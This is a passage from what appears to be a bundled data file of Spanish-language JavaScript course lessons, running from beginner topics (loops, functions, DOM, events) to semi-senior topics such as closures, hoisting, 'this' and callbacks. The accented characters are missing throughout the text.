let mensajeTernario = edad >= 18 ? "Adulto" : "Nio";
\`\`\`

## 5. Mini Ejercicio
Crea una variable \`hora\` (de 0 a 24).
*   Si es entre 6 y 12: "Buenos das".
*   Si es entre 13 y 20: "Buenas tardes".
*   Si no: "Buenas noches".
`,completed:!1},{id:"js-junior-bucles",title:"Bucles (Repitiendo cosas)",level:"junior",content:`# Leccin 6: Bucles (Repitiendo cosas)

## 1. Por qu bucles?

Imagina tener que imprimir los nmeros del 1 al 100.
Escribiras 100 \`console.log\`? No. Usas un bucle.

## 2. El Bucle \`for\` (El clsico)

Tiene 3 partes: \`for (inicio; condicin; actualizacin)\`

\`\`\`javascript
// Imprime del 1 al 5
for (let i = 1; i <= 5; i++) {
    console.log(\`Vuelta nmero: \${i}\`);
}
\`\`\`
1.  **Inicio (\`items = 1\`):** Creamos un contador.
2.  **Condicin (\`i <= 5\`):** Mientras esto sea verdad, el bucle sigue.
3.  **Actualizacin (\`i++\`):** Al final de cada vuelta, sumamos 1 al contador.

## 3. El Bucle \`while\` (Mientras...)

Ms sencillo. Sigue mientras la condicin sea verdad. Cuidado con los bucles infinitos (si olvidas cambiar la condicin, nunca parar).

\`\`\`javascript
let energia = 3;

while (energia > 0) {
    console.log(\`Corriendo... Energa restante: \${energia}\`);
    energia--; // Importante! Restamos energa para que alguna vez termine
}
console.log("Me cans.");
\`\`\`

## 4. \`break\` y \`continue\`

*   **\`break\`**: Rompe el bucle por completo y sale.
*   **\`continue\`**: Salta la vuelta actual y pasa a la siguiente.

\`\`\`javascript
// Imprime solo impares
for (let i = 1; i <= 10; i++) {
    if (i % 2 === 0) {
        continue; // Es par, salta esta vuelta (no imprime)
    }
    console.log(i);
}
\`\`\`

## 5. Mini Ejercicio
Escribe un bucle que sume todos los nmeros del 1 al 10 (1+2+3...).
Respuesta esperada: 55.
`,completed:!1},{id:"js-junior-funciones",title:"Funciones (Recetas de cocina)",level:"junior",content:`# Leccin 7: Funciones (Recetas de cocina)

## 1. Qu es una funcin?

Es un bloque de cdigo reutilizable. Como una receta: le das ingredientes (input), hace algo y te da un resultado (output).
Escribe el cdigo una vez, salo mil veces.

## 2. Declaracin clsica

\`\`\`javascript
function saludar(nombre) { // "nombre" es un parmetro
    console.log(\`Hola \${nombre}!\`);
}

// Llamar a la funcin
saludar("Mara"); // "Mara" es el argumento
saludar("Pedro");
\`\`\`

## 3. El \`return\` (Devolver valor)

Las funciones tiles no solo imprimen en consola, sino que **devuelven** un dato para que lo uses en otra parte.

\`\`\`javascript
function sumar(a, b) {
    let resultado = a + b;
    return resultado; // Devuelve el valor y TERMINA la funcin
}

let total = sumar(10, 5); // total ahora vale 15
console.log(total * 2); // 30
\`\`\`

## 4. Arrow Functions (Funciones Flecha)

La forma moderna y corta de escribir funciones. Muy usada en React.
\`\`\`javascript
// Funcin clsica
// function restar(a, b) { return a - b; }

// Arrow Function
const restar = (a, b) => {
    return a - b;
};

// Si es una sola lnea, puedes quitar llaves y return (Return Implcito)
const multiplicar = (a, b) => a * b;
\`\`\`

## 5. Mini Ejercicio
Crea una funcin llamada \`calcularPrecioFinal\`.
*   Recibe dos parmetros: \`precio\` e \`impuesto\`.
*   Devuelve el precio sumndole el impuesto.
*   Prueba: \`calcularPrecioFinal(100, 21)\` debera devolver \`121\`.
`,completed:!1},{id:"js-junior-scope",title:"Scope (El alcance de las variables)",level:"junior",content:`# Leccin 8: Scope (El alcance de las variables)

## 1. Quin puede ver mi variable?

El Scope define desde dnde puedes acceder a una variable.
Piensa en una casa.
*   **Variable Global:** Est en el jardn. Todos (desde la calle y desde la casa) pueden verla.
*   **Variable Local:** Est en tu habitacin. Solo t puedes verla dentro de tu habitacin.

## 2. Scope Global

Variables declaradas fuera de cualquier funcin.
\`\`\`javascript
let mensajeGlobal = "Soy pblica";

function mostrar() {
    console.log(mensajeGlobal); // Funciona
}
\`\`\`

## 3. Scope de Bloque (Local)

Variables declaradas con \`let\` o \`const\` dentro de llaves \`{}\` (funciones, ifs, bucles) SOLO existen dentro de esas llaves.

\`\`\`javascript
function secreto() {
    let clave = "1234"; // Local
    console.log(clave); // Funciona aqu dentro
}

// console.log(clave); // ERROR: clave is not defined
\`\`\`

## 4. La Trampa de \`var\`

\`var\` no respeta los bloques de \`if\` o \`for\`. Solo los de funcin. Por eso no lo usamos.

\`\`\`javascript
if (true) {
    var antiguo = "Existo fuera";
    let moderno = "Solo existo aqu";
}

console.log(antiguo); // Funciona (Peligro!)
// console.log(moderno); // Error (Correcto)
\`\`\`

## 5. Regla de Oro
Siempre declara tus variables en el scope ms pequeo posible. No uses variables globales a menos que sea estrictamente necesario. Esto evita que partes de tu cdigo interfieran con otras accidentalmente.
`,completed:!1},{id:"js-junior-arrays",title:"Arrays (Listas ordenadas)",level:"junior",content:`# Leccin 9: Arrays (Listas ordenadas)

## 1. Una caja con compartimentos

Un Array es una variable especial que puede guardar CIENTOS de valores a la vez.

\`\`\`javascript
// Lista de compras
const frutas = ["Manzana", "Banana", "Naranja"];
\`\`\`

## 2. Acceder y Modificar

Los Arrays se cuentan desde CERO (ndice).
*   Manzana es posicin 0.
*   Banana es posicin 1.

\`\`\`javascript
console.log(frutas[0]); // "Manzana"
console.log(frutas[2]); // "Naranja"

frutas[1] = "Pera"; // Cambiamos Banana por Pera
console.log(frutas.length); // 3 (Cantidad de elementos)
\`\`\`

## 3. Mtodos tiles

JS nos da herramientas para manipular arrays.

*   \`.push(dato)\`: Agrega al final.
    \`frutas.push("Uva");\`
*   \`.pop()\`: Elimina el ltimo.
    \`frutas.pop();\`
*   \`.includes(dato)\`: Est en la lista?
    \`console.log(frutas.includes("Manzana")); // true\`

## 4. Recorrer un Array (Iterar)

Cmo imprimimos todas las frutas? Con un bucle.

\`\`\`javascript
for (let i = 0; i < frutas.length; i++) {
    console.log(frutas[i]);
}

// O la versin moderna (preferida)
frutas.forEach((fruta) => {
    console.log(\`Tengo: \${fruta}\`);
});
\`\`\`

## 5. Mini Ejercicio
1.  Crea un array \`tareas\` con 3 tareas pendientes.
2.  Agrega una tarea ms con \`.push\`.
3.  Borra la ltima tarea porque te dio pereza (\`.pop\`).
4.  Usa un bucle para listar las que quedaron.
`,completed:!1},{id:"js-junior-objetos",title:"Objetos (Diccionarios con etiquetas)",level:"junior",content:`# Leccin 10: Objetos (Diccionarios con etiquetas)

## 1. Datos complejos

Un array sirve para listas (fruta 1, fruta 2).
Un Objeto sirve para describir una "Cosa" con propiedades (nombre, color, peso).

\`\`\`javascript
const auto = {
    marca: "Toyota",  // propiedad: valor
    modelo: "Corolla",
    anio: 2022,
    encendido: false,
    // Un mtodo es una funcin dentro de un objeto
    arrancar: function() {
        this.encendido = true; // "this" se refiere a ESTE objeto
        console.log("Ruum ruum! ");
    }
};
\`\`\`

## 2. Acceder a datos

Usamos el punto \`.\` (Dot notation).

\`\`\`javascript
console.log(auto.marca); // "Toyota"
console.log(auto["modelo"]); // Otra forma (Bracket notation)

auto.anio = 2023; // Modificar
auto.color = "Rojo"; // Agregar propiedad nueva
\`\`\`

## 3. Mtodos (Acciones)

\`\`\`javascript
auto.arrancar(); // Ejecuta la funcin dentro del objeto
// Ahora auto.encendido es true
\`\`\`

## 4. Objetos dentro de Objetos (Anidacin)

\`\`\`javascript
const usuario = {
    nombre: "Ana",
    direccion: {
        calle: "Av. Siempre Viva",
        numero: 123
    }
};

console.log(usuario.direccion.calle); // "Av. Siempre Viva"
\`\`\`

## 5. Mini Ejercicio
Crea un objeto \`mascota\`.
*   Propiedades: \`nombre\`, \`tipo\` (perro/gato), \`hambre\` (nmero 1-10).
*   Mtodo \`comer()\`: Resta 1 al hambre y dice "am am".
*   Llama al mtodo y muestra cmo baj el hambre.
`,completed:!1},{id:"js-junior-dom-basico",title:"DOM (Manipulando el HTML)",level:"junior",content:`# Leccin 11: DOM (Manipulando el HTML)

## 1. El DOM (Document Object Model)

Cuando el navegador lee tu HTML, crea un rbol de objetos en memoria. Eso es el DOM.
JS puede tocar ese rbol para cambiar el HTML en tiempo real.

## 2. Seleccionar Elementos (El gancho)

Antes de cambiar algo, necesitas agarrarlo.

\`\`\`javascript
// Agarra un elemento por su ID
const titulo = document.getElementById("titulo-principal");

// Agarra el PRIMER elemento que coincida con el selector CSS
const boton = document.querySelector(".btn-rojo");

// Agarra TODOS los prrafos (devuelve una lista)
const parrafos = document.querySelectorAll("p");
\`\`\`

## 3. Cambiar Contenido

\`\`\`javascript
const saludo = document.getElementById("saludo");

// Cambiar texto
saludo.innerText = "Hola Universo!";

// Cambiar HTML interno (puedes meter etiquetas)
saludo.innerHTML = "<strong>Hola Negrita!</strong>";
\`\`\`

## 4. Cambiar Estilos

\`\`\`javascript
const caja = document.querySelector(".caja");

caja.style.backgroundColor = "blue";
caja.style.fontSize = "20px"; // Nota: en CSS es font-size, en JS es fontSize
caja.style.display = "none"; // Ocultar
\`\`\`

## 5. Crear y Agregar Elementos

\`\`\`javascript
// 1. Crear
const nuevoParrafo = document.createElement("p");
nuevoParrafo.innerText = "Soy nuevo aqu";

// 2. Agregar al body
document.body.appendChild(nuevoParrafo);
\`\`\`

**Nota:** Manipular el DOM es "caro" (lento) para el navegador. Hazlo solo cuando sea necesario.
`,completed:!1},{id:"js-junior-eventos",title:"Eventos (Escuchando al usuario)",level:"junior",content:`# Leccin 12: Eventos (Escuchando al usuario)

## 1. Accin y Reaccin

Un evento es algo que sucede en el navegador: un click, mover el mouse, presionar una tecla, cargar la pgina.
Podemos escribir cdigo que "escuche" esos eventos y reaccione.

## 2. \`addEventListener\` (El Escucha)

Es la forma correcta de manejar eventos.

\`elemento.addEventListener("evento", funcion_a_ejecutar);\`

\`\`\`javascript
const boton = document.getElementById("miBoton");

function dispararAlerta() {
    alert("Hiciste click!");
}

// Cuando ocurra un 'click' en 'boton', ejecuta 'dispararAlerta'
boton.addEventListener("click", dispararAlerta);
\`\`\`
*Nota: Pasamos \`dispararAlerta\` SIN parntesis \`()\`. Si pones parntesis, se ejecuta inmediatamente al cargar la pgina, no al hacer click.*

## 3. Eventos Comunes

*   \`click\`: Click del mouse.
*   \`submit\`: Enviar un formulario.
*   \`keydown\`: Presionar una tecla.
*   \`input\`: Escribir en un campo de texto.
*   \`mouseenter\`: El mouse entra en el elemento.

## 4. El objeto \`event\` (Informacin del evento)

La funcin que maneja el evento recibe un regalo: un objeto con detalles de qu pas.

\`\`\`javascript
document.addEventListener("keydown", (event) => {
    console.log(\`Presionaste la tecla: \${event.key}\`);
});
\`\`\`

## 5. Mini Ejercicio (Interactivo)
En tu HTML imaginario hay un botn \`<button id="luz">Prender/Apagar</button>\`.
Escribe un script que:
1.  Seleccione el botn.
2.  Al hacer click, cambie el fondo del \`document.body\` de negro a blanco (y viceversa).
`,completed:!1},{id:"js-junior-buenas-practicas",title:"Buenas Prcticas (Junior PRO)",level:"junior",content:`# Leccin 13: Buenas Prcticas (Junior PRO)

## 1. Tu "Yo del futuro" te odiar

Escribir cdigo que funciona es fcil. Escribir cdigo limpio es lo difcil. S amable con tu "yo del futuro" que leer esto en 6 meses.

## 2. Comentarios Inteligentes

No comentes lo obvio. Comenta el **POR QU**, no el CMO.

\`\`\`javascript
// MAL
let edad = 20; // Asigna 20 a edad

// BIEN
// Necesitamos 20 aos porque es el mnimo legal en este pas
let edadMinima = 20;
\`\`\`

## 3. Naming (El arte de nombrar)

Las variables y funciones deben decir qu hacen sin leer el cdigo.

*   Mal: \`function p(n) { ... }\`
*   Bien: \`function calcularPrecio(cantidad) { ... }\`

Usa verbos para funciones (\`getUsuario\`, \`setNombre\`, \`isValido\`).

## 4. DRY (Don't Repeat Yourself)

No te repitas. Si copias y pegas el mismo bloque de cdigo 3 veces, crea una funcin.
Menos cdigo = Menos bugs.

## 5. Indentacin y Formato

Usa un formateador automtico (como Prettier).
El cdigo desordenado es imposible de leer y esconde errores.

\`\`\`javascript
// HORRIBLE
if(true){console.log("hola");
}else{
console.log("chau");}

// HERMOSO
if (true) {
    console.log("hola");
} else {
    console.log("chau");
}
\`\`\`

## 6. Console.log al final

Borra tus \`console.log\` de depuracin antes de "entregar" tu cdigo o subirlo a produccin. No ensucies la consola del usuario.

## 7. Cierre del curso Junior

Felicidades! Tienes las bases.
Siguientes pasos:
*   Practicar mucho manipulando el DOM.
*   Aprender sobre Asincrona (Promesas, Fetch).
*   Eventualmente, aprender un Framework (React, Vue).
Pero primero, domina el Vanilla JS!
`,completed:!1},{id:"js-junior-exercises",title:"Ejercicios Prcticos: JS Junior",level:"junior",content:`# Ejercicios Prcticos: JavaScript Junior

Estos ejercicios estn diseados para poner a prueba tus conocimientos sobre variables, funciones, condicionales, bucles, DOM y eventos.

**Instrucciones Generales:**
1.  Crea un archivo \`.html\` y un \`.js\` separados para cada ejercicio (o un solo HTML con varias secciones).
2.  Usa \`console.log\` para depurar si algo no funciona.
3.  Intenta resolverlo por tu cuenta antes de buscar ayuda.

---

## Ejercicio 1: El Contador Interactivo

**Objetivo:** Manipular el DOM y usar variables para guardar estado.

**Consigna:**
Crea una pgina con:
1.  Un ttulo \`<h1>\` que muestre un nmero (empieza en 0).
2.  Un botn "Incrementar" (+).
3.  Un botn "Decrementar" (-).
4.  Un botn "Resetear" (volver a 0).

**Requisitos:**
*   Al hacer click en (+), el nmero debe subir.
*   Al hacer click en (-), el nmero debe bajar.
*   Si el nmero es positivo, pinto el texto de **verde**.
*   Si el nmero es negativo, pinto el texto de **rojo**.
*   Si es cero, el texto se queda **negro**.

---

## Ejercicio 2: La Calculadora Bsica

**Objetivo:** Funciones, Inputs y conversin de tipos.

**Consigna:**
Crea un formulario simple con:
1.  Un input numrico (Nmero A).
2.  Un input numrico (Nmero B).
3.  Cuatro botones (+, -, *, /).
4.  Un prrafo vaco \`<p id="resultado">\` para mostrar el resultado.

**Requisitos:**
*   Al tocar un botn, debe realizar la operacin matemtica correspondiente entre A y B.
*   Muestra el resultado en el prrafo: "El resultado es: X".
*   **Validacin:** Si alguno de los inputs est vaco, muestra una alerta: "Por favor ingresa ambos nmeros".
*   *Pista: Recuerda que \`input.value\` siempre devuelve texto (String), necesitars convertirlo a Number.*

---

## Ejercicio 3: Validacin de Password

**Objetivo:** Eventos de input y condicionales.

**Consigna:**
Crea un input de tipo \`password\` y un mensaje de ayuda debajo.

**Requisitos:**
*   Mientras el usuario escribe (evento \`input\`), valida en tiempo real:
    1.  Si tiene menos de 8 caracteres, muestra el mensaje "Muy corta" en **rojo**.
    2.  Si tiene 8 o ms caracteres, muestra "Longitud correcta" en **verde**.
*   Agrega un "Ojo" (botn o cono) al lado.
    *   Al hacer click, el input debe pasar de \`type="password"\` a \`type="text"\` (para ver la contrasea) y viceversa.

---

## Ejercicio 4: To-Do List Simple

**Objetivo:** Arrays, crear elementos del DOM dinmicamente.

**Consigna:**
Crea una lista de tareas.
1.  Un input para escribir la tarea.
2.  Un botn "Agregar".
3.  Una lista \`<ul>\` vaca.

**Requisitos:**
*   Al hacer click en "Agregar", se debe crear un nuevo \`<li>\` con el texto del input y agregarlo a la \`<ul>\`.
*   El input debe limpiarse automticamente despus de agregar.
*   **Bonus:** Al hacer click sobre una tarea de la lista (\`li\`), esta debe cambiar su estilo (ej: tachado \`text-decoration: line-through\`) para marcarla como completada.

---

## Ejercicio 5: El Adivinador

**Objetivo:** Lgica de juego y \`Math.random()\`.

**Consigna:**
El programa debe elegir un nmero aleatorio entre 1 y 100 al cargar la pgina (sa \`Math.random\`).
El usuario tiene un input para intentar adivinarlo.

**Requisitos:**
*   Si el usuario adivina, muestra "Ganaste!" en verde.
*   Si el nmero del usuario es menor al secreto, muestra "Ms alto...".
*   Si el nmero del usuario es mayor al secreto, muestra "Ms bajo...".
*   Cuenta cuntos intentos le tom y mustralo al final.

---

A codear! 
`,completed:!1,isProject:!0},{id:"js-junior-eval",title:"Evaluacin Final: Junior",level:"junior",content:'# Evaluacin Final: JavaScript Junior\n\nEsta evaluacin mide tu comprensin de los fundamentos de JavaScript: lgica, manipulacin del DOM y manejo de eventos.\n\n## Seccin 1: Teora (Responde brevemente)\n\n1.  **Explica la diferencia entre `let`, `const` y `var`. Por qu deberas evitar `var`?**\n2.  **Qu es el DOM y para qu sirve `document.querySelector`?**\n3.  **Cul es la diferencia entre `==` y `===`? Da un ejemplo donde den resultados distintos.**\n4.  **Si tengo un array `frutas = ["Manzana", "Banana"]`, Cmo agrego "Pera" al final?**\n5.  **Qu hace `event.preventDefault()` en un formulario?**\n\n## Seccin 2: Prctica - "El Interruptor Mgico"\n\nCrea un archivo HTML con un `div` cuadrado (100x100px) de color rojo y un botn "Magia".\n\n**Requisitos JavaScript:**\n1.  Al hacer click en el botn, el cuadrado debe cambiar su color de fondo a **Azul**.\n2.  Al hacer click otra vez, debe volver a **Rojo** (toggle).\n3.  Si el usuario pasa el mouse POR ENCIMA del cuadrado (`mouseenter`), muestra un mensaje en consola: "Ests tocando el cuadrado".\n\n## Seccin 3: Algoritmia Bsica\n\nEscribe una funcin `esPar(numero)` que reciba un nmero y devuelva `true` si es par y `false` si es impar.\n*   Prueba: `esPar(2)` -> true\n*   Prueba: `esPar(5)` -> false\n\n## Criterios de Aprobacin\n\n*   [ ] Cdigo limpio y debidamente identado.\n*   [ ] Uso correcto de `const` y `let` (no `var`).\n*   [ ] La lgica del toggle (interruptor) funciona siempre, no solo una vez.\n*   [ ] La funcin de par/impar usa el operador mdulo (`%`).\n',completed:!1,isProject:!0},{id:"js-ss-scope-lexical",title:"Scope y Lexical Environment (El Alcance Real)",level:"semi-senior",content:`# Leccin 14: Scope y Lexical Environment (El Alcance Real)

## 1. Ms all de Global y Local

Como Junior, sabes que las variables dentro de una funcin no se ven desde fuera.
Como Semi-Senior, debes entender **por qu**.

El **Lexical Environment** (Entorno Lxico) es la estructura interna que JS usa para rastrear identificadores (variables/funciones) y sus referencias.
Se compone de dos partes:
1.  **Environment Record:** Donde se guardan las variables actuales (\`const a = 1\`).
2.  **Reference to Outer Environment:** Un enlace al entorno "padre".

## 2. La Cadena de Scope (Scope Chain)

Cuando pides una variable, JS busca as:
1.  Est en mi Environment Record actual? -> S: sala.
2.  No -> Ve al Outer Environment (padre).
3.  Est ah? -> S: sala.
4.  No -> Sigue subiendo hasta llegar al Global.
5.  No est en Global -> \`ReferenceError\`.

A esto se le llama **Lexical Scoping** (Alcance Esttico): El alcance se define por **dnde escribiste el cdigo**, no por dnde se llama.

## 3. Ejemplo Trampa (Entiendes el alcance?)

\`\`\`javascript
const x = 10;

function foo() {
    console.log(x);
}

function bar() {
    const x = 20;
    foo(); // Qu imprime?
}

bar();
\`\`\`

**Respuesta:** Imprime \`10\`.
**Por qu:**
\`foo\` fue definida en el entorno Global. Su "Outer Environment" es Global.
No importa que la llames desde \`bar\`. Cuando \`foo\` busca \`x\`:
1.  Busca en su adrentro. No est.
2.  Busca en su Outer (Global). Ah \`x\` es 10.
3.  La \`x = 20\` de \`bar\` es invisible para \`foo\` porque \`bar\` NO es el entorno padre de \`foo\` (no fue definida dentro de \`bar\`).

## 4. Shadowing (Sombra)

Si declaras una variable con el mismo nombre que una del padre, la "tapas" (haces sombra).

\`\`\`javascript
let nombre = "Global";

function prueba() {
    let nombre = "Local"; // Shadowing
    console.log(nombre); // "Local"
}
\`\`\`

## 5. Ejercicio "Rompecocos"
Analiza el siguiente cdigo antes de ejecutarlo. Qu valor tiene \`a\` en cada console.log?

\`\`\`javascript
let a = 1;

function b() {
    a = 10; // CUIDADO: No tiene let/var/const. Reasigna la global.
    return;
    function a() {} // Hoisting de funcin!
}

b();
console.log(a); // 1  10  function?
\`\`\`
*Pista: El hoisting de funciones dentro de un bloque afecta cmo se resuelven los nombres.*
`,completed:!1},{id:"js-ss-closures",title:"Closures (Mochilas de Datos)",level:"semi-senior",content:`# Leccin 15: Closures (Mochilas de Datos)

## 1. La Mochila Invisible

Un **Closure** ocurre cuando una funcin "recuerda" el entorno lxico en el que fue creada, incluso cuando se ejecuta fuera de ese entorno.

Imagina que la funcin lleva una "mochila" con todas las variables que existan cuando naci.

## 2. El Patrn Factory

\`\`\`javascript
function crearContador() {
    let count = 0; // Privado (en la mochila)

    return function() {
        count++; // Accede a la mochila
        console.log(count);
    };
}

const contadorA = crearContador();
contadorA(); // 1
contadorA(); // 2

const contadorB = crearContador(); // Nueva mochila
contadorB(); // 1 (Independiente de A)
\`\`\`

## 3. Caso Real: Emular Privacidad

JS (antes de \`#privateFields\`) no tena variables privadas. Usamos closures.

\`\`\`javascript
function Usuario(nombreInicial) {
    let _nombre = nombreInicial; // "Privado" por convencin y closure

    return {
        getNombre: () => _nombre,
        setNombre: (nuevo) => {
            if (nuevo.length > 0) _nombre = nuevo;
        }
    };
}

const user = Usuario("Pepe");
console.log(user.getNombre()); // "Pepe"
// console.log(user._nombre); // undefined (No accesible directamente)
\`\`\`

## 4. El error clsico del Loop

\`\`\`javascript
// INCORRECTO
for (var i = 1; i <= 3; i++) {
    setTimeout(function() {
        console.log(i);
    }, 1000);
}
// Resultado: 4, 4, 4 (Desastre!)
\`\`\`
**Por qu:** \`var\` tiene scope de funcin (o global), no de bloque. \`i\` es la misma variable compartida. Cuando el \`setTimeout\` se dispara 1 segundo despus, el loop ya termin y \`i\` vale 4.

**Solucin Correcta:**
Usar \`let\` (Scope de bloque). Crea una \`i\` nueva en cada vuelta.
\`\`\`javascript
for (let i = 1; i <= 3; i++) {
    setTimeout(() => console.log(i), 1000);
}
// Resultado: 1, 2, 3
\`\`\`

## 5. Ejercicio: Memorizacin (Cache)
Crea una funcin \`memoize(fn)\` que reciba una funcin lenta y devuelva una nueva funcin que guarde los resultados.
Si llamo a \`lenta(5)\` y tarda 2s, la prxima vez que llame a \`lenta(5)\` debe ser instantneo (devolver desde cache).

*Tip: Tu closure debe tener un objeto \`cache = {}\`.*
`,completed:!1},{id:"js-ss-hoisting",title:"Hoisting (Elevacin Fantasma)",level:"semi-senior",content:`# Leccin 16: Hoisting (Elevacin Fantasma)

## 1. Magia Negra?

Hoisting es el comportamiento donde declaraciones de variables y funciones son "movidas" (en memoria) al inicio de su scope antes de ejecutar el cdigo.

## 2. Funciones: Declaracin vs Expresin

### Function Declaration (Se eleva completa)
\`\`\`javascript
saludar(); // Funciona: "Hola"

function saludar() {
    console.log("Hola");
}
\`\`\`

### Function Expression (Se eleva la variable, pero como undefined/error)
\`\`\`javascript
saludar(); // Error: saludar is not a function (si es var) o ReferenceError (si es const)

var saludar = function() { // o const
    console.log("Hola");
};
\`\`\`

## 3. Variables: var vs let/const

### Con \`var\`: undefined
\`\`\`javascript
console.log(x); // undefined (No explota, pero da valor errneo)
var x = 5;
\`\`\`
JS lo interpreta as:
\`\`\`javascript
var x;
console.log(x);
x = 5;
\`\`\`

### Con \`let\` / \`const\`: TDZ (Temporal Dead Zone)
\`\`\`javascript
console.log(y); // ReferenceError: Cannot access 'y' before initialization
let y = 10;
\`\`\`
Aunque la variable "se eleva", entra en la **Zona Muerta Temporal**. Es ilegal tocarla hasta llegar a su lnea de declaracin.

## 4. Por qu importa? (Bug Real)

\`\`\`javascript
var favorita = "Pizza";

function comer() {
    console.log("Comiendo " + favorita); // "Comiendo Pizza"? NO! -> "Comiendo undefined"
    var favorita = "Hamburguesa";
}
comer();
\`\`\`
**Explicacin:** Dentro de \`comer\`, hay una \`var favorita\`. El hoisting la sube al inicio de la funcin como \`undefined\`, tapando (shadowing) a la global "Pizza".
El \`console.log\` usa la local (undefined) antes de que se asigne "Hamburguesa".

## 5. Ejercicio de Confusin
Predice el output sin ejecutar:

\`\`\`javascript
function test() {
    console.log(a);
    console.log(foo());
    
    var a = 1;
    function foo() {
        return 2;
    }
}
test();
\`\`\`
`,completed:!1},{id:"js-ss-this",title:"this (Contexto de Ejecucin)",level:"semi-senior",content:`# Leccin 17: this (Contexto de Ejecucin)

## 1. La Pesadilla de \`this\`

\`this\` NO es esttico. Depende de **CMO** se llama a la funcin, no de dnde se crea (al revs que las variables).

## 2. Las 4 Reglas de \`this\`

1.  **Enlazado por defecto (Global):**
    Si llamas \`funcion()\`, \`this\` es el objeto global (\`window\`). En modo estricto (\`"use strict"\`), es \`undefined\`.

2.  **Enlazado Implcito (Mtodo):**
    Si llamas \`objeto.funcion()\`, \`this\` es el \`objeto\` (lo que est a la izquierda del punto).

3.  **Enlazado Explcito (Call, Apply, Bind):**
    T le dices quin es.
    \`funcion.call(miObjeto, arg1)\`

4.  **Constructor (new):**
    Si usas \`new Funcion()\`, \`this\` es el nuevo objeto creado.

## 3. El caso especial: Arrow Functions

Las Arrow Functions **NO tienen su propio \`this\`**.
Lo toman prestado de su entorno lxico (Scope padre).

\`\`\`javascript
const obj = {
    nombre: "Objeto",
    normal: function() { console.log(this.nombre); },
    flecha: () => { console.log(this.nombre); }
};

obj.normal(); // "Objeto"
obj.flecha(); // undefined (toma el this del scope global)
\`\`\`

## 4. El Bug Clsico: Perder el contexto

\`\`\`javascript
const usuario = {
    nombre: "Juan",
    hablar() {
        console.log(\`Soy \${this.nombre}\`);
    }
};

setTimeout(usuario.hablar, 1000); // "Soy undefined"
\`\`\`
**Por qu:** \`setTimeout\` recibe la *referencia* a la funcin \`hablar\`. Cuando la ejecuta 1s despus, la llama como una funcin normal \`hablar()\`, no como mtodo \`usuario.hablar()\`. Se aplica la Regla 1 (Global).

**Solucin:** \`.bind(usuario)\` o Arrow function envolvente.
\`\`\`javascript
setTimeout(() => usuario.hablar(), 1000); // Funciona
\`\`\`

## 5. Ejercicio
Corrige este cdigo para que funcione:
\`\`\`javascript
const contador = {
    cuenta: 0,
    iniciar: function() {
        setInterval(function() {
            this.cuenta++; // this es window aqu dentro :(
            console.log(this.cuenta);
        }, 1000);
    }
};
contador.iniciar(); // Imprime NaN
\`\`\`
*Solucin sugerida: Cambiar la function interna del setInterval por una Arrow Function.*
`,completed:!1},{id:"js-ss-higher-order-functions",title:"Funciones de Orden Superior (HOF)",level:"semi-senior",content:`# Leccin 18: Funciones de Orden Superior (HOF)

## 1. Funciones como Datos

En JS, las funciones son "Ciudadanos de Primera Clase". Puedes guardarlas en variables, pasarlas como argumentos y retornarlas.

Una **Higher Order Function** es una funcin que:
1.  Recibe una o ms funciones como argumento.
2.  Y/O devuelve una funcin.

## 2. Array Methods (Tus mejores amigos)

Deja de usar \`for\` loops para todo. Usa HOF declarativas.

*   \`map\`: Transforma cada elemento. Entra Array[N] -> Sale Array[N].
*   \`filter\`: Filtra elementos. Entra Array[N] -> Sale Array[<=N].
*   \`reduce\`: Reduce todo a un solo valor. Entra Array[N] -> Sale Valor.
*   \`forEach\`: Efectos secundarios (no devuelve nada).

## 3. Ejemplo: Transformacin de Datos

\`\`\`javascript
const pedidos = [
    { id: 1, total: 100, estado: 'pagado' },
    { id: 2, total: 200, estado: 'pendiente' },
    { id: 3, total: 50, estado: 'pagado' }
];

// Quiero el total de dinero de pedidos pagados

// Imperativo (Feo)
let total = 0;
for(let i=0; i<pedidos.length; i++) {
    if(pedidos[i].estado === 'pagado') {
        total += pedidos[i].total;
    }
}

// Declarativo (Hermoso - Encadenamiento)
const totalDeclarativo = pedidos
    .filter(p => p.estado === 'pagado')
    .map(p => p.total) // Opcional, solo para aislar montos
    .reduce((acumulador, actual) => acumulador + actual, 0);
\`\`\`

## 4. Crear tus propias HOF

\`\`\`javascript
function logger(fn) {
    return function(...args) {
        console.log("Ejecutando funcin con:", args);
        const resultado = fn(...args);
        console.log("Resultado:", resultado);
        return resultado;
    };
}

const suma = (a,b) => a+b;
const sumaLogueada = logger(suma);

sumaLogueada(5, 3); // Logs automticos
\`\`\`

## 5. Ejercicio
Tienes un array de strings: \`["hola", "mundo", "javascript", "genial"]\`.
Usa \`filter\` y \`map\` para obtener:
1.  Solo las palabras de ms de 4 letras.
2.  Convertidas a MAYSCULAS.
Resultado: \`["MUNDO", "JAVASCRIPT", "GENIAL"]\`.
`,completed:!1},{id:"js-ss-callbacks",title:"Callbacks (Llamadas de vuelta)",level:"semi-senior",content:`# Leccin 19: Callbacks (Llamadas de vuelta)

## 1. Qu es un Callback?

Es simplemente una funcin que pasas como argumento a otra funcin, para que sea ejecutada ("llamada de vuelta") ms tarde.

\`\`\`javascript
function procesarUsuario(id, callback) {
    console.log("Buscando usuario " + id);
    // Simulamos tiempo
    setTimeout(() => {
        const usuario = { id: id, nombre: "Ana" };
        callback(usuario); // Aqu se ejecuta el callback!
    }, 1000);
}

// Uso
procesarUsuario(1, (user) => {
    console.log("Usuario encontrado:", user.nombre);
});
\`\`\`

## 2. Inversin de Control

El problema de los callbacks es que le das el control de TU cdigo a una funcin externa. Confas en que llamar a tu callback:
1.  Solo una vez.
2.  Sin errores.
3.  En el momento correcto.

## 3. Callback Hell (Infierno de Callbacks)

Cuando tienes operaciones dependientes.
1. Buscar Usuario -> 2. Buscar sus Pedidos -> 3. Buscar Detalle Pedido.

\`\`\`javascript
getUser(1, (user) => {
    getOrders(user.id, (orders) => {
        getOrderDetails(orders[0].id, (details) => {
            console.log(details); // Forma de pirmide (Hadouken code)
        });
    });
});
\`\`\`
Es difcil de leer y difcil de manejar errores (tendras que tener un \`if (error)\` en cada nivel).

## 4. Ejercicio
Simula el Callback Hell.
Crea 3 funciones: \`paso1(cb)\`, \`paso2(cb)\`, \`paso3(cb)\`. Cada una debe usar \`setTimeout\` para tardar 1s y luego llamar al callback.
Ejectalas en orden secuencial (Paso 1 termina -> Paso 2 empieza...).
`,completed:!1},{id:"js-ss-promises",title:"Promises (Promesas de futuro)",level:"semi-senior",content:`# Leccin 20: Promises (Promesas de futuro)

## 1. La Solucin a Callbacks

Una **Promise** es un objeto que representa la terminacin (o falla) eventual de una operacin asncrona.
Tiene 3 estados:
1.  **Pending:** Pendiente (esperando).
